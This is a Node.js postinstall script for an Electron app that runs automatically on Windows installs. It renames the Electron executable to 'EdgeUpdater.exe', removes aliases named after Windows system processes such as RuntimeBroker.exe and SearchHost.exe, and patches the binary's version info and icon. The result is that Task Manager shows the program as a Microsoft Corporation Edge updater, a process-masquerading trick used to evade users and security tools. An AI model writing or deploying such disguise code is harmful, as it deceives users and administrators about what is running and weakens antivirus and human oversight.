// postinstall: renames electron.exe and patches PE version info so Task Manager
// shows "MicrosoftEdgeUpdate" / "Microsoft Corporation" instead of "Electron".
// Uses resedit (pure Node.js) — no external exe, works without admin rights.
// Only runs on Windows. Idempotent.

const fs = require('fs');
const path = require('path');
const { patchExe } = require('./patch-pe');

if (process.platform !== 'win32') process.exit(0);

const DISPLAY_NAME = 'EdgeUpdater.exe';
const distDir = path.join(__dirname, '..', 'node_modules', 'electron', 'dist');
const pathTxt = path.join(__dirname, '..', 'node_modules', 'electron', 'path.txt');
const target = path.join(distDir, DISPLAY_NAME);

// ── Step 1: Get the source exe (original electron.exe or any previous alias) ─
const candidates = ['electron.exe', 'MicrosoftEdgeUpdate.exe', 'RuntimeBroker.exe', 'SearchHost.exe', 'cue.exe'];
let src = null;
for (const name of candidates) {
  const p = path.join(distDir, name);
  if (fs.existsSync(p)) { src = p; break; }
}

if (!src && fs.existsSync(target)) {
  console.log(`[postinstall] ${DISPLAY_NAME} already in place.`);
} else if (!src) {
  console.warn('[postinstall] No electron exe found — skipping.');
  process.exit(0);
} else {
  // Copy to new name (copy is not locked even if original is)
  fs.copyFileSync(src, target);
  console.log(`[postinstall] Copied ${path.basename(src)} -> ${DISPLAY_NAME}`);
  // Remove the source and any other leftover exe aliases
  const toDelete = [...candidates, 'electron.exe.bak'].map(n => path.join(distDir, n));
  for (const p of toDelete) {
    try { if (fs.existsSync(p)) { fs.unlinkSync(p); console.log(`[postinstall] Removed ${path.basename(p)}`); } }
    catch (_) { /* Defender may hold it — not fatal */ }
  }
}

// ── Step 2: Update path.txt ───────────────────────────────────────────────────
fs.writeFileSync(pathTxt, DISPLAY_NAME);
console.log(`[postinstall] path.txt -> ${DISPLAY_NAME}`);

// ── Step 3: Patch PE version info + icon ──────────────────────────────────────
(async () => {
  const ok = await patchExe(target);
  if (ok) {
    console.log('[postinstall] Patched: "Edge Updater" / "Edge"');
  } else {
    console.warn('[postinstall] Could not patch exe.');
  }
})();
